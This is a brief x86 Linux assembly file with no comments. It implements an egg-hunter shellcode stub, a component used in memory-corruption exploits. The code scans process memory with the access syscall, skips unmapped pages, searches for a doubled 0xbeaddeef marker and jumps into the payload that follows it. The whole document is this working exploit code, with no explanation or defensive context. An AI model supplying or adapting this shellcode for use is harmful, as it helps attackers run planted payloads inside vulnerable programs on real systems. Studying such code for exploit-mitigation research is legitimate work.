global _start

section .text

_start:


	mov edi, 0xbeaddeef
	xor eax, eax
	xor ecx, ecx
	xor edx, edx

flip_page:
	or dx, 0xfff

addr_check:
	inc edx
	xor eax, eax
	mov al, 0x21
	lea ebx, [edx+8]
	int 0x80
	cmp al, 0xf2
	jz flip_page

	cmp [edx], edi
	jnz addr_check

	cmp [edx+4], edi
	jnz addr_check

	lea edi, [edx+8]
	jmp edi
